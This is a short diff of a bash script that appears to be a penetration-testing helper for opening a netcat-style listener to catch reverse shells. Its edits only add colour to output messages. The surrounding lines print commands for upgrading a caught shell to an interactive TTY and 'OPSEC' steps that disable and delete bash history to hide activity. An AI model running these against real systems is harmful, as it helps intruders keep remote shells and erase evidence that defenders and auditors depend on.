@@ -8,7 +8,7 @@ if [ "$1" == "l" ] || [ "$1" == "listen" ] ; then
   fi
   CMD="$CMD -vlkp $PORT"
   # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
-  echo "[*] Shell upgrade instructions:"
+  echo "${info} Shell upgrade instructions:"
   echo "    python -c 'import pty;pty.spawn(\"/bin/bash\")'"
   echo "    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
   echo "    Ctrl-z"
@@ -19,11 +19,11 @@ if [ "$1" == "l" ] || [ "$1" == "listen" ] ; then
   COLS="$(stty -a | grep -oE "columns [0-9]{1,}" | cut -d' ' -f2)"
   echo -e " stty rows $ROWS columns $COLS\n"
   # https://attack.mitre.org/techniques/T1070/003/
-  echo "[*] OPSEC Linux:"
+  echo "${info} OPSEC Linux:"
   echo "    unset HISTFILE; export HISTFILESIZE=0;"
   echo "    # make sure to check history before deleting!"
   echo -e "    history -c; rm ~/.bash_history\n"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   bash -c "$CMD"
   exit
 fi
